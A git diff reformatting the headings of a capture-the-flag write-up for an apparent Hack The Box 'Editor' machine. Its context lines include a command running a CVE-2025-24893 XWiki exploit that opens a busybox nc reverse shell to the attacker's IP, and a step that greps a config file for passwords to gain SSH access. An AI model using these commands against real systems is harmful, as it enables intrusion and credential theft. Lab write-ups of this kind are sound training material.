@@ -9,15 +9,12 @@ author: 0x3bs
 
 ![](/assets/images/editor/7.png)
 
----
-> ### Quick Navigation
-> - [Enumeration](#enumeration)
-> - [Exploitation](#exploitation)
-> - [SSH Creds](#ssh-credentials)
-> - [Privilege Escalation](#privilege-escalation)
----  
 
-# Enumeration
+------
+------
+
+
+> ### Enumeration
 
   
 first start with `nmap` :
@@ -131,15 +128,17 @@ OK now let's check `http://editor.htb:8080`
 
   
 
-After search about this version , i found this CVE
+After search about this version `XWiko Debian 15.10.8` , i found this CVE
 
   
 
 [CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)
 
----
+----
+----
 
-# Exploitation
+
+> ### Exploitation
 
 From the `CVE-2025-24893` and after install it , this the exploitation code :
 
@@ -149,9 +148,12 @@ python3 CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.10
 
 ![](/assets/images/editor/2.png)
 
----
+----
+----
 
-# SSH Credentials
+
+> ### SSH Credentials
+
 
 In the shell i found this file `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml` which was interesting , let's open it with grepping `password` to find any password in it :
 
@@ -182,8 +184,11 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
 ![](/assets/images/editor/5.png)
 
 ----
+----
 
-# Privilege Escalation 
+
+> ### Privilege Escalation 
+
 
 After running this command :
 
